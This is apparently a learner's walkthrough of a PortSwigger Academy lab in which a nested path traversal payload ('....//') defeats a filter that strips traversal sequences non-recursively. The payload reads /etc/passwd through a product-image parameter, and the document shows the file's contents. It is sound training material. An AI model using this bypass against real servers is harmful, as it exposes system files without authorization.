
# #PortSwigger 



![[Pasted image 20251214143119.png]]


## Lab Description

>This lab contains a path traversal vulnerability in the display of product images. The application strips path traversal sequences from the user-supplied filename before using it.
>
>**Objective:** Retrieve the contents of the `/etc/passwd` file.

---
---


### Step 1: Capture the Image Request

1. In Burp's browser, access the lab
2. Browse to a product page
3. Find an image request in Burp Proxy    

**Example request:**
```
GET /image?filename=29.jpg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```


![[Pasted image 20251214143148.png]]


---

### Step 2: Send to Repeater

Right-click the request --> **Send to Repeater**

---

### Step 3: Modify the Filename

**Original:**
```
GET /image?filename=product1.jpg HTTP/1.1
```

**Modified (nested traversal):**
```
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```


![[Pasted image 20251214143706.png]]

---

### Step 4: Send the Request

1. Click **Send** in Repeater
2. Observe the response

**Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```


![[Pasted image 20251214143805.png]]


---

### Step 5: Lab Solved

![[Pasted image 20251214143823.png]]


---
---

